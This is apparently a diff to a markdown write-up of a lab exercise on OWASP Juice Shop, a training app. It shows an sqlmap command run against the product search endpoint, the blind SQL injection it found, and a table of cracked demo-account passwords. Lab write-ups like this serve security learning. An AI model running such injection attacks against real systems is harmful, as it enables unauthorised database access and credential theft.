@@ -28,13 +28,17 @@ Captured the backend request:
 
 sql
 GET /rest/products/search?q=
+
 Used Firefox Dev Tools → “Copy as cURL” → converted into raw HTTP request (juice-request.txt)
 
 ## 3. Ran SQLMap
 
 sqlmap -r juice-request.txt --batch --tables
+
 ✅ Backend DBMS: SQLite
+
 ✅ SQL Injection Type: Boolean-based blind
+
 ✅ 20 database tables retrieved
 
 ## 4. Dumped Users Table
@@ -52,7 +56,7 @@ SQLMap auto-cracked several MD5 hashes using its built-in dictionary:
 | `accountant@juice-sh.op` | customer | `ncc-1701`       |
 
 
-### 🧠 Takeaways
+## 🧠 Takeaways
 SQL injection can still be found in modern web apps using APIs.
 
 SQLite doesn’t support multi-db enumeration, but data can still be dumped.
